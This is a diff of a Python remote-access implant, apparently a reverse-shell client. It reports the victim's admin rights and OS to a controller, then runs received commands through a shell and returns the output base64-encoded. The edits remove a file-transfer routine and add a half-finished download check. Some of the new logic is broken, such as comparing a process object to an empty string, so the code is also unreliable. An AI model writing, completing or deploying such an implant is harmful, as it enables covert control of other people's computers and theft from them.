@@ -20,20 +20,6 @@ def inbound():
             sock.close()
 
 
-def download_file(file_name):
-    file = open(file_name, 'wb')
-    sock.settimeout(1)
-    file_data = sock.recv(1024)
-    while file_data:
-        file.write(file_data)
-        try:
-            file_data = sock.recv(1024)
-        except socket.timeout:
-            break
-    sock.settimeout(None)
-    file.close()
-
-
 def outbound(message):
     response = str(message)
     response = base64.b64encode(bytes(response, encoding="utf-8"))
@@ -47,7 +33,7 @@ def session_handler():
         outbound(ctypes.windll.shell32.IsUserAnAdmin())
         time.sleep(1)
         op_sys = platform.uname()
-        op_sys = (f'{op_sys[0]} {op_sys[2]}')
+        op_sys = f'{op_sys[0]} {op_sys[2]}'
         outbound(op_sys)
         while True:
             message = inbound()
@@ -74,17 +60,24 @@ def session_handler():
                 continue
 
             # Work in progress
-            elif message == 'upload' or message == 'up':
-                download_file(message[7:])
-                outbound('File Downloaded')
-                continue
+            elif message == 'download':
+                file_dl = message.strip('download ')
+                if os.path.exists(file_dl):
+                    exists = "yes"
+                    outbound(exists)
+                else:
+                    exists = "no"
+                    outbound(exists)
+                    continue
+
             else:
                 command = subprocess.Popen(message,
                                            shell=True,
                                            stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE)
-                output = command.stdout.read() + command.stderr.read()
-                outbound(output.decode())
+                if command == "":
+                    output = command.stdout.read() + command.stderr.read()
+                    outbound(output.decode())
     except ConnectionRefusedError:
         pass
 
